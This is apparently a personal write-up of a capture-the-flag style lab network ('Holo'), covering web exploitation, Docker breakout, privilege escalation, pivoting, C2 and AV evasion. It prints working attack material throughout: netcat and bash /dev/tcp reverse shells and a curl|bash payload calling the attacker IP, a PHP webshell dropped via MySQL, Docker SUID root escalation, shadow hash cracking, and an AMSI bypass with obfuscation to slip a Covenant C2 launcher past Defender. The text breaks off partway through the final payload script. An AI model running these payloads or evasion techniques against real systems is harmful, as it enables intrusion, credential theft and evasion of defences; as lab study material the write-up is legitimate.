## .NET Basics
- .NET uses a runtime env called the Common Language Runtime (CLR)
- Can use .NET languages (C#, Powershell, etc.) to compile to Common Intermediary Language (CIL) 
- .NET interfaces directly with Win32 and API calls (great for offensive!)
- Two branches: .NET Framework (windows only) and .NET Core (cross-compatible)
- .NET assemblies = compiled .exe and .dll or anything that is executable by .NET
- Flow is .NET language > CIL/MSIL > CLR > Machine code
- Unmanaged code gets directly compiled to machine code, skipping CLR (ex. Donut, UnmanagedPowerShell)
- Visual Studio is a C# compiler (there's also GCC, MinGW, etc.)

![0e36579167c4ff5b90c473120bdbbcbc.png](0e36579167c4ff5b90c473120bdbbcbc-1.png)

## Web App Exploitation
First, I did a quick nmap ping sweep
```sh
$ nmap -sn 10.200.69.0/24

Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-09 12:25 EDT
Nmap scan report for 10.200.69.33
Host is up (0.12s latency).
Nmap scan report for 10.200.69.250
Host is up (0.12s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 9.58 seconds
```

Then, I ran rustscan (targeted) because it's blazing fast. 
```sh
$ sudo rustscan -a 10.200.69.33,10.200.69.250 -r 1-65535 --ulimit 5000 | tee rustscan.txt  

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| | 
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'           
The Modern Day Port Scanner. 
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍                              

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.200.69.250:22                            
Open 10.200.69.33:22                             
Open 10.200.69.33:80                             
Open 10.200.69.250:1337                          
Open 10.200.69.33:33060 
```

Then, I did targeted comprehensive nmap scans and converted the results to html with xsltproc
```sh
$ nmap -A -p22,80,33060 -oA nmap-33 10.200.69.33
$ nmap -A -p22,1337 -oA nmap-250 10.200.69.250
```

![66cda55fef6a42c6cb52d55a1a1dc87f.png](66cda55fef6a42c6cb52d55a1a1dc87f-1.png)
![55971d3f639b0a538b9422a7bace24d5.png](55971d3f639b0a538b9422a7bace24d5-1.png)

I added the following line to my `/etc/hosts`:
```
10.200.69.33 holo.live 
```

Virtual host discovery
```sh
## Getting the response length of false positives
$ curl -s -H "Host: nonexistent.holo.live" http://holo.live | wc -c 
21456

## Filtering out false positive response lengths
$ ffuf -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://holo.live -H "Host: FUZZ.holo.live" -fs 21456

-[SNIPPED]-

admin                   [Status: 200, Size: 1845, Words: 453, Lines: 76]
dev                     [Status: 200, Size: 7515, Words: 639, Lines: 272]
www                     [Status: 200, Size: 21405, Words: 1285, Lines: 156]
```

Modified the line in `/etc/hosts` to reflect the virtual hosts
```
10.200.69.33 holo.live www.holo.live admin.holo.live dev.holo.live
```

Running ffuf on `www.holo.live`, `admin.holo.live`, and `dev.holo.live`
```sh
$ ffuf -ic -c -w /usr/share/wordlists/dirb/big.txt -u http://www.holo.live/FUZZ -e .php,.html,.bak | tee ffuf-www.txt
$ ffuf -ic -c -w /usr/share/wordlists/dirb/big.txt -u http://admin.holo.live/FUZZ -e .php,.html,.bak | tee ffuf-admin.txt
$ ffuf -ic -c -w /usr/share/wordlists/dirb/big.txt -u http://dev.holo.live/FUZZ -e .php,.html,.bak | tee ffuf-dev.txt
```

`www.holo.live` files: 
```
license.txt             [Status: 200, Size: 19915, Words: 3331, Lines: 385]
robots.txt              [Status: 200, Size: 913, Words: 23, Lines: 23]
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1]
wp-trackback.php        [Status: 200, Size: 135, Words: 11, Lines: 5]
```

`admin.holo.live` files: 
```
db_connect.php          [Status: 200, Size: 0, Words: 1, Lines: 1]                             
index.php               [Status: 200, Size: 1845, Words: 453, Lines: 76]                         
robots.txt              [Status: 200, Size: 135, Words: 5, Lines: 5]                
```

`dev.holo.live` files: 
```
about.php               [Status: 200, Size: 9612, Words: 897, Lines: 296]
img.php                 [Status: 200, Size: 0, Words: 1, Lines: 1]
index.php               [Status: 200, Size: 7515, Words: 639, Lines: 272]
```

Visiting `admin.holo.live/robots.txt` gives out a very interesting file
```
User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt
```

Upon some investigation, `dev.holo.live/img.php` seems to load image files, and this can be exploited with LFI using the URL `dev.holo.live/img.php?file=images/../../admin/supersecretdir/creds.txt`
![54f4612307cbb0ad28f29eaefe017a7e.png](54f4612307cbb0ad28f29eaefe017a7e-1.png)

Obviously, the LFI can leak a lot of information, like `/etc/passwd`: 
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
```

The LFI allows us to download a file that leaks the admin credentials for `admin.holo.live`:
```
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3
```

![d294f4773aa845ff23f250cc77051672.png](d294f4773aa845ff23f250cc77051672-1.png)

![258006adb88f1962614069acd2a94322.png](258006adb88f1962614069acd2a94322-1.png)

I captured the Cookie for the session by using the Network tab in the developer tools (will be used for fuzzing)
```
Cookie: PHPSESSID=5kn1gjhssrlgmbgbj1tu3fni9c
```

Using ffuf to fuzz parameters of `dashboard.php`
```sh
## Getting the response length of false positives
$ curl -s -H "Cookie: PHPSESSID=5kn1gjhssrlgmbgbj1tu3fni9c" http://admin.holo.live/dashboard.php | wc -c
15869

## Fuzzing for potential RCE parameters (irregular responses)
$ ffuf -ic -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://admin.holo.live/dashboard.php?FUZZ=ls -b PHPSESSID=5kn1gjhssrlgmbgbj1tu3fni9c -fs 15869

-[SNIPPED]-
cmd                     [Status: 200, Size: 15981, Words: 3958, Lines: 404]
```

Netcat reverse shell 
```sh
## listening
$ nc -nvlp 31337

## executing reverse shell with RCE
curl -s -H "Cookie: PHPSESSID=5kn1gjhssrlgmbgbj1tu3fni9c" http://admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+10.50.70.253+31337   

## stabilizing shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
## background with CTRL+Z here
echo $TERM  ## use this info for TERM later
stty -a  ## use this info for rows and columns later
stty raw -echo && fg
export TERM=<term>  ## use info from previous 
stty rows <rows> columns <cols>  ## use info from previous
reset
```

## Docker Breakout 
Containers have networking capabilities and their own file storage. They do this by using components of the Linux kernel: 
- Namespaces
- Cgroups
- OverlayFS

Every process on Linux is assigned a PID and namespace. Namespaces are key to containerization, since processes can only "see" the process that is in the namespace. 

Characteristic of a Docker environment is the relatively low amount of processes running: 
```sh
www-data@c0369dbd7240:/var/www/admin$ ps aux

USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4632   832 pts/0    Ss   14:28   0:00 /bin/sh -c /etc/init.d/apache2 start && /etc/init.d/mysql start && /bin/bash
root          27  0.0  0.4 373648 18756 ?        Ss   14:28   0:00 /usr/sbin/apache2 -k start
www-data      30  0.0  0.1 373680  7092 ?        S    14:28   0:00 /usr/sbin/apache2 -k start
www-data      31  0.0  0.3 374212 12184 ?        S    14:28   0:00 /usr/sbin/apache2 -k start
www-data      32  0.0  0.1 373680  7092 ?        S    14:28   0:00 /usr/sbin/apache2 -k start
www-data      33  0.0  0.2 374040 11080 ?        S    14:28   0:00 /usr/sbin/apache2 -k start
www-data      34  0.0  0.3 374204 14240 ?        S    14:28   0:00 /usr/sbin/apache2 -k start
mysql         75  0.0  0.0   4632  1672 ?        S    14:28   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        429  0.2  4.6 1621092 188264 ?      Sl   14:28   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysql/error.log 
root         509  0.0  0.0  18512  3044 pts/0    S+   14:28   0:00 /bin/bash
www-data     514  0.0  0.1 373680  7096 ?        S    14:30   0:00 /usr/sbin/apache2 -k start
www-data     517  0.0  0.0   4632   820 ?        S    14:30   0:00 sh -c nc -e /bin/sh 10.50.70.253 31337
www-data     518  0.0  0.0   4632   864 ?        S    14:30   0:00 sh
www-data     519  0.0  0.2  36676  8524 ?        R    14:31   0:00 python3 -c import pty;pty.spawn('/bin/bash')
www-data     520  0.0  0.0  18512  3524 pts/1    Ss   14:31   0:00 /bin/bash
www-data     530  0.0  0.0  34408  2884 pts/1    R+   14:33   0:00 ps aux
```

The `.dockerenv` file in the `/` directory also indicates a Docker environment: 
```sh
www-data@c0369dbd7240:/var/www/admin$ ls -la /

total 340
drwxr-xr-x   1 root root   4096 Apr 12 14:28 .
drwxr-xr-x   1 root root   4096 Apr 12 14:28 ..
-rwxr-xr-x   1 root root      0 Apr 12 14:28 .dockerenv
-rw-r--r--   1 root root 266240 Jan  4  2021 apache.tar
drwxr-xr-x   1 root root   4096 Jan 16  2021 bin
drwxr-xr-x   2 root root   4096 Apr 24  2018 boot
drwxr-xr-x   5 root root    360 Apr 12 14:28 dev
drwxr-xr-x   1 root root   4096 Apr 12 14:28 etc
drwxr-xr-x   2 root root   4096 Apr 24  2018 home
drwxr-xr-x   1 root root   4096 May 23  2017 lib
drwxr-xr-x   1 root root   4096 Jan 16  2021 lib64
drwxr-xr-x   2 root root   4096 Sep 21  2020 media
drwxr-xr-x   2 root root   4096 Sep 21  2020 mnt
drwxr-xr-x   2 root root   4096 Sep 21  2020 opt
dr-xr-xr-x 129 root root      0 Apr 12 14:28 proc
drwx------   2 root root   4096 Sep 21  2020 root
drwxr-xr-x   1 root root   4096 Jan 16  2021 run
drwxr-xr-x   1 root root   4096 Jan 16  2021 sbin
drwxr-xr-x   2 root root   4096 Sep 21  2020 srv
dr-xr-xr-x  13 root root      0 Apr 12 14:28 sys
drwxrwxrwt   1 root root   4096 Apr 12 14:28 tmp
drwxr-xr-x   1 root root   4096 Sep 21  2020 usr
drwxr-xr-x   1 root root   4096 Jan 16  2021 var
```

Checking `/proc/1/cgroup` can also be extremely helpful (looking for the string "docker"):
```sh
www-data@c0369dbd7240:/var/www/admin$ cat /proc/1/cgroup 

12:pids:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
11:hugetlb:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
10:perf_event:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
9:freezer:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
8:memory:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
7:rdma:/
6:blkio:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
5:cpuset:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
4:net_cls,net_prio:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
3:devices:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
2:cpu,cpuacct:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
1:name=systemd:/docker/c0369dbd7240716eca0c8dd6c0dff685ef28be978b707e8b9038522c47e99aca
0::/system.slice/containerd.service
```

The webserver (L-SRV02) user flag is located at `/var/www/user.txt`

Enumerating routing table, finding the default gateway `192.168.100.1`
```sh
www-data@c0369dbd7240:/var/www$ route -n

Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
0.0.0.0         192.168.100.1   0.0.0.0         UG    0      0        0 eth0
192.168.100.0   0.0.0.0         255.255.255.0   U     0      0        0 eth0
```

Port scanning `192.168.100.1` with `nc` (netcat)
```sh
www-data@c0369dbd7240:/var/www$ nc -znv 192.168.100.1 1-65535

(UNKNOWN) [192.168.100.1] 33060 (?) open
(UNKNOWN) [192.168.100.1] 8080 (http-alt) open
(UNKNOWN) [192.168.100.1] 3306 (mysql) open
(UNKNOWN) [192.168.100.1] 80 (http) open
(UNKNOWN) [192.168.100.1] 22 (ssh) open
```

Credentials for DB in `/var/www/admin/db_connect.php`
```sh
www-data@c0369dbd7240:/var/www/admin$ cat db_connect.php 

<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>
```

Logging in and enumerating the remote database at `192.168.100.1` with the acquired credentials.
```
www-data@c0369dbd7240:/var/www$ mysql -h 192.168.100.1 -u admin -p 
Enter password:         
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| DashboardDB        |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use DashboardDB;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_DashboardDB |
+-----------------------+
| users                 |
+-----------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----------+-----------------+
| username | password        |
+----------+-----------------+
| admin    | DBManagerLogin! |
| gurag    | AAAA            |
+----------+-----------------+
2 rows in set (0.00 sec)
```

Since there is a mysql server and webserver running on the same instance, the mysql access can be used to drop a PHP webshell onto the remote filesystem. Then, using `curl` targeting the webserver allows RCE from the dropped webshell:

Dropping a webshell through mysql:
```
mysql> select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';
```

Checking for dropped webshell and verifying RCE (notice the IP address `192.168.100.1` is what is expected): 
```sh
www-data@6116f85dc4fe:/var/www/admin$ curl -I http://192.168.100.1:8080/shell.php

HTTP/1.1 200 OK
Date: Tue, 12 Apr 2022 16:32:19 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8

www-data@6116f85dc4fe:/var/www/admin$ curl http://192.168.100.1:8080/shell.php?cmd=ip%20a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:e3:7b:d0:21:67 brd ff:ff:ff:ff:ff:ff
    inet 10.200.69.33/24 brd 10.200.69.255 scope global dynamic eth0
       valid_lft 3550sec preferred_lft 3550sec
    inet6 fe80::e3:7bff:fed0:2167/64 scope link 
       valid_lft forever preferred_lft forever
3: br-19e3b4fa18b8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:05:fd:bd:f3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.1/24 brd 192.168.100.255 scope global br-19e3b4fa18b8
       valid_lft forever preferred_lft forever
    inet6 fe80::42:5ff:fefd:bdf3/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:86:c1:01:b6 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: veth98e775c@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-19e3b4fa18b8 state UP group default 
    link/ether e6:e1:a2:78:37:34 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::e4e1:a2ff:fe78:3734/64 scope link 
       valid_lft forever preferred_lft forever
www-data@6116f85dc4fe:/var/www/admin$ curl http://192.168.100.1:8080/shell.php?cmd=whoami
www-data
```

Now that RCE is possible, can make the target server download a shell script (reverse shell) from the attacker machine and execute it. 

`shellscript.sh`
```
#!/bin/bash
bash -i >& /dev/tcp/10.50.70.253/53 0>&1 
```

Hosting the script file on attacker machine using updog
```
updog -p 1234
```

From the compromised Docker machine, trigger the RCE on the newly exploited machine to activate a reverse shell. (Set up a netcat listener beforehand on attacker machine to catch the shell)

Unencoded payload: 
```
curl http://10.50.70.253:1234/shellscript.sh|bash &
```

Full curl command (run on compromised Docker):
```
curl http://192.168.100.1.:8080/shell.php?cmd=curl+http%3A%2F%2F10.50.70.253%3A1234%2Fshellscript.sh%7Cbash+%26
```

Now we have a shell on the database machine on L-SRV01
```
www-data@ip-10-200-69-33:/var/www/html$ whoami
www-data
www-data@ip-10-200-69-33:/var/www/html$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:e3:7b:d0:21:67 brd ff:ff:ff:ff:ff:ff
    inet 10.200.69.33/24 brd 10.200.69.255 scope global dynamic eth0
       valid_lft 3384sec preferred_lft 3384sec
    inet6 fe80::e3:7bff:fed0:2167/64 scope link 
       valid_lft forever preferred_lft forever
3: br-19e3b4fa18b8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:cf:8e:51:3c brd ff:ff:ff:ff:ff:ff
    inet 192.168.100.1/24 brd 192.168.100.255 scope global br-19e3b4fa18b8
       valid_lft forever preferred_lft forever
    inet6 fe80::42:cfff:fe8e:513c/64 scope link 
       valid_lft forever preferred_lft forever
4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:dd:5f:fb:1c brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
6: veth0267b15@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-19e3b4fa18b8 state UP group default 
    link/ether 12:ec:4c:20:de:78 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::10ec:4cff:fe20:de78/64 scope link 
       valid_lft forever preferred_lft forever
```

A user flag for L-SRV01 is found at `/var/www/user.txt`

## Privilege Escalation / Post Exploitation
On L-SRV01, we need a way to download Linpeas to enumerate for privesc vectors. Again, host linpeas.sh on Kali with updog and download it (just like the shell script)
```
wget http://10.50.70.253:1234/linpeas.sh 
chmod +x linpeas.sh
sh linpeas.sh
```

Notice that Docker is set with the SUID bit, meaning there is possibly a privesc vulnerability. 
![04fc436902abb030d08bd787276e1d7f.png](04fc436902abb030d08bd787276e1d7f-1.png)

Looking through GTFObins, there is a section which mentions what to do when SUID is set on the Docker binary.  However, since the box has no Internet connection, some enumeration of Docker images present locally is needed. 
```
www-data@ip-10-200-69-33:/var/www/html$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
<none>              <none>              cb1b741122e8        15 months ago       995MB
<none>              <none>              b711fc810515        15 months ago       993MB
<none>              <none>              591bb8cd4ef6        15 months ago       993MB
<none>              <none>              88d15ba62bf4        15 months ago       993MB
ubuntu              18.04               56def654ec22        18 months ago       63.2MB
 
```

With the `ubuntu` image in mind, we simply run the privilege escalation command.

The root flag for L-SRV01 is located at `/root/root.txt`

```
/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh

# ls
bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
# whoami
root
```

At this point, we can read from `/etc/shadow` and transfer the hashes to crack them. 
We can use hashcat locally to crack, but cooler is with Google Colab.
Now we can use the colabcat repo, https://github.com/someshkar/colabcat, to start up a colab instance with the hashcat settings pre-prepared.

![0feb134f731d5bc5ed3dcd21a6bdb4e7.png](0feb134f731d5bc5ed3dcd21a6bdb4e7-1.png)

Unfortunately for me, Colabcat didn't work as intended (was stuck on a step), so I had to crack hashes locally. 

```
hashcat -m 1800 -a 0 target_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
```

With the newly cracked hash, we have persistence on L-SRV01 via SSH.
```
$6$Zs4KmlUsMiwVLy2y$V8S5G3q7tpBMZip8Iv/H6i5ctHVFf6.fS.HXBw9Kyv96Qbc2ZHzHlYHkaHm8A5toyMA3J53JU.dc6ZCjRxhjV1:linuxrulez   
```

SSH login: 
```
ssh linux-admin@10.200.69.33    
# enter "linuxrulez" for password
```

## Pivoting
Many tools to help with pivoting: 
-   sshuttle
-   Chisel
-   Ligolo
-   Metasploit autoroute

We know that L-SRV01 is on the x86_64 (amd64) architecture based on 
```
uname -p
```

I used chisel on Kali and uploaded an amd64 binary to run on the target machine. 
```
chisel server -p 8001 --reverse  ## on Kali
./chisel client 10.50.70.253:8001 R:socks  ## on target
```

Now that the SOCKS server is setup, we still need to add it to proxychains in `/etc/proxychains.conf` as an additional line: 
```
socks5 127.0.0.1 1080
```

Now all commands that should be routed through the proxy is prepended with `proxychains`, as in something like `proxychains curl http://<IP>`

## Command and Control
For C2, I used Covenant.
https://github.com/cobbr/Covenant/wiki

After installing Covenant, run in `Covenant/Covenant` directory (and then visit the webpage)
```
sudo dotnet run
```

## Web App Exploitation
After proxying the traffic through the proxy set up in previous steps, can visit `10.200.69.31` in the browser and inspect. 
![28cff572c4889ccbf6078f48851b2ae2.png](28cff572c4889ccbf6078f48851b2ae2-1.png)

It turns out that we already have the username `gurag` (think way back to first steps from the database)

After sending a forgot password request, the `user_token` cookie can be seen in the response
![7aad71dbf300d0f6738ddc8f5767448e.png](7aad71dbf300d0f6738ddc8f5767448e-1.png)

This can be reused in the URL, and the creds changed to whatever we want, like `gurag:gurag`
```
http://10.200.69.31/password_reset.php?user=gurag&user_token=bb5b79812a9669e55b1a4c1fb9a08ede5809c91a0c576bf8d50a3a17d12dcbfa9642342054696c1ebd1e5d850083721e188a
```

![676d829a169e61019d311761e3da93f5.png](676d829a169e61019d311761e3da93f5-1.png)

Success! (This includes one of the flags for S-SRV01)

![3cf591e837e77616abfab4f57a56ff35.png](3cf591e837e77616abfab4f57a56ff35-1.png)

![2141c181b639901ecff8fd7281978028.png](2141c181b639901ecff8fd7281978028-1.png)

Ok, at this point some of the IPs have changed in my environment.

![4b4a6afbb6ce53d584369c47e4e1cfcc.png](4b4a6afbb6ce53d584369c47e4e1cfcc-1.png)

Of course, there is a file upload vulnerability here in that it only checks for the MIME types that aren't `image/jpeg`. If you intercept the upload POST request in Burp, you can simply change the MIME type to whatever you want while still uploading malicious PHP files, for example.

![8b537f5538bbfedc440678ff0f516c58.png](8b537f5538bbfedc440678ff0f516c58-1.png)

## AV Evasion
AMSI (Anti-Malware Scan Interface) is one of our enemies. It's a Powershell security feature thta allows applications or services to integrate into antimalware products. There are bypasses for AMSI available online in all sorts of formats, like Powershell scripts. Note that, if the AV doesn't kill it, files are uploaded to the `/images/` directory (that one was a head-scratcher for a while, getting me lots of 404's ...)

Here is an example of an AMSI bypass (`.ps1` Powershell Script): 
```
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 

[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
```

You can use the AmsiTrigger tool to check for any strings or even entire code blocks that have been caught by AMSI https://github.com/RythmStick/AMSITrigger

![2e414f0e31f9728a090f93065040eab5.png](2e414f0e31f9728a090f93065040eab5-1.png)

![3ffce72e9aae6cd7d6a0726646876d46.png](3ffce72e9aae6cd7d6a0726646876d46-1.png)

Try to obfuscate strings with these string methods: 

- Concatenate - `('co'+'ffe'+'e')`
- Reorder - `('{1}{0}'-f'ffee','co')`
- Whitespace - `( 'co' +'fee' + 'e')`

Also, you can try to create your own type accelerators, which are basically aliases.
(they can shorten strings like `[System.Management.Automation.AliasAttribute]` to some `[Alias]`)

Here's a one-liner example for aliasing `[system.runtime.interopservices.marshal]` with `[dorkstork]`: 
```
[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('dorsktork', [system.runtime.interopservices.marshal])
```

So now our example obfuscated AMSI bypass looks like: 
```
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

<--SNIPPED-->


# obfuscate type accelerator
[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('nowayjose', [system.runtime.interopservices.marshal])

[nowayjose]::copy($buf, 0, $BufferAddress, 6);
```

Nice! We have a working AMSI bypass now. 

![99ba04aac94f13215a7f301f81cb6fe8.png](99ba04aac94f13215a7f301f81cb6fe8-1.png)

Next, we want to obfuscate the Powershell launcher (payload) that Covenant C2 generates for us to create a grunt (agent) that can call back to us. 
To do this, we can use Invoke-Obfuscation https://github.com/danielbohannon/Invoke-Obfuscation

https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide

Here is an example of running Invoke-Obfuscation (THIS IS JUST AN EXAMPLE): 
```
Invoke-Obfuscation -ScriptBlock {'Payload Here'} -Command 'Token\\String\\1,2,\\Whitespace\\1' -Quiet -NoExit
```

To explain what the command above is doing, the `String` and `Whitespace` methods used are: 

![8b116d6c336913fd731afe0bd29374d6.png](8b116d6c336913fd731afe0bd29374d6-1.png)
![35adf0bcb37a93608d916a28452831fa.png](35adf0bcb37a93608d916a28452831fa-1.png)

When creating a token command, be careful not to obfuscate the payload too much and exceed the 8191 character limit in a Windows cmd prompt.

All of this is good, but it really may not work all that well in real environments. So to test that, we can use tools like ThreatCheck (you can build from the solution .sln file in Visual Studio) or DefenderCheck to run tests and see what gets caught in the payload. 

Our unmodified Covenant launcher gets caught by ThreatCheck: 
![67ee2991d092573c0320ce4936e09571.png](67ee2991d092573c0320ce4936e09571-1.png)

But, applying the simple change with aliasing (aka type accelerators) earlier, we can hide the offending bytes with the line:
```
[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('zipitup', [IO.Compression.CompressionMode])
```

Success!

![0801ca4db957818042cf5856c4621697.png](0801ca4db957818042cf5856c4621697-1.png)

We can then attach our already obfuscated AMSI bypass to the beginning of the grunt launcher payload. Here's what the final payload looks like (notice that it comes in two parts, one for the AMSI bypass, one for the Covenant launcher, and both are obfuscated):

```ps1
# Amsi bypass
$MethodDefinition = "

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
";

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
